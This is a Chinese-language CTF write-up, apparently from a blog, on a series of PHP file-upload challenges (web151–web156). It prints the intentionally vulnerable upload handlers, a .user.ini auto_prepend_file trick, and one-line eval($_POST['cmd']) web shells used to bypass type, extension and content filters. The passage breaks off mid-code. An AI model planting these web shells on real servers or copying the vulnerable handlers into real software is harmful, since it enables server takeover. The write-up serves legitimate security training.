        <content type="html"><![CDATA[<h1 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h1><p>最简单的文件上传，上传图片马后抓包修改后缀绕过文件名检测</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230227200134482.png" alt="image-20230227200134482"></p><p>源码：</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$filesize</span> = (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$filesize</span>&gt;<span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件超过1024KB&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h1 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h1><p>看题目描述没理解，大小写绕了一下但是后端没有解析，于是继续传图片马改成php然后getshell</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230227200842473.png" alt="image-20230227200842473"></p><p>源码：</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$filesize</span> = (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$filesize</span>&gt;<span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件超过1024KB&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br></pre></td></tr></table></figure></div><p>可以看到只是对文件类型也就是content-type进行了判断而已</p><h1 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h1><p>这里传图片马再改后缀返回的是：</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230227201346740.png" alt="image-20230227201346740"></p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230227201354276.png" alt="image-20230227201354276"></p><p>大小写可以上传但不能解析，其他php后缀同理，这里nginx服务器考虑.user.ini</p><p>原理：指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：require(.&#x2F;a.jpg);这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有exit()时该设置无效）所以要求当前目录必须要有php文件</p><p>巧合的是这题upload目录下有个index.php，所以这种方式是可以成功的。</p><p>还有的师傅这样解释到：</p><blockquote><p>user.ini.它比.htaccess用的更广，不管是nginx&#x2F;<a href="https://so.csdn.net/so/search?q=apache&spm=1001.2101.3001.7020">apache</a>&#x2F;IIS，只要是以fastcgi运行的php都可以用这个方法。<br>条件:<br>服务器脚本语言为PHP<br>对应目录下面有可执行的php文件,如index.php<br>服务器使用CGI／FastCGI模式</p></blockquote><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230227201410090.png" alt="image-20230227201410090"></p><p>注意要先传个.user.ini配置文件</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230227202839645.png" alt="image-20230227202839645"></p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=<span class="number">2</span>.png</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">auto_append_file=<span class="number">2</span>.png</span><br></pre></td></tr></table></figure></div><p>然后，传个图片，upload下的index.php就会包含并执行它啦</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230227203108605.png" alt="image-20230227203108605"></p><p>源码：</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$filesize</span> = (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$filesize</span>&gt;<span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件超过1024KB&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$arr</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ext_suffix</span>!=<span class="string">&#x27;php&#x27;</span>)&#123;</span><br><span class="line">                <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">                <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br></pre></td></tr></table></figure></div><p>可以看出是黑名单，对php这个后缀做了限制</p><h1 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h1><p>上传个正常图片都失败，因为我的图片马里面有敏感信息，应该是php，用以下替代</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">&lt;?</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line">&lt;% <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);%&gt;</span><br></pre></td></tr></table></figure></div><p>还是不能解析，结合上一题上传的配置文件，就可以getshell了</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230227203943539.png" alt="image-20230227203943539"></p><p>源码：</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$filesize</span> = (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$filesize</span>&gt;<span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件超过1024KB&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$arr</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ext_suffix</span>!=<span class="string">&#x27;php&#x27;</span>)&#123;</span><br><span class="line">                <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">strrpos</span>(<span class="variable">$content</span>, <span class="string">&quot;php&quot;</span>)==<span class="literal">FALSE</span>)&#123;</span><br><span class="line">                    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">                    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">3</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件内容不合规&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br></pre></td></tr></table></figure></div><p>可以看到content即对文件内容进行了检测</p><h1 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h1><p>做法同上</p><p>源码：</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$filesize</span> = (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$filesize</span>&gt;<span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件超过1024KB&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$arr</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ext_suffix</span>!=<span class="string">&#x27;php&#x27;</span>)&#123;</span><br><span class="line">                <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$content</span>, <span class="string">&quot;php&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">                    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">                    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br></pre></td></tr></table></figure></div><h1 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h1><p>继续对文件内容进行了限制</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230227222413450.png" alt="image-20230227222413450"></p><p>过滤了中括号，改为大括号</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230227222452770.png" alt="image-20230227222452770"></p><p>其他步骤同上题</p><p><img src="https://picture-1312836458.cos.ap-beijing.myqcloud.com/img/image-20230227222559423.png" alt="image-20230227222559423"></p><p>源码：</p><div class="highlight-wrap" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$filesize</span> = (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$filesize</span>&gt;<span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件超过1024KB&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$arr</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ext_suffix</span>!=<span class="string">&#x27;php&#x27;</span>)&#123;</span><br><span class="line">                <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$content</span>, <span class="string">&quot;php&quot;</span>)===<span class="literal">FALSE</span> &amp;&amp; <span class="title function_ invoke__">stripos</span>(<span class="variable">$content</span>,<span class="string">&quot;[&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">                    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span 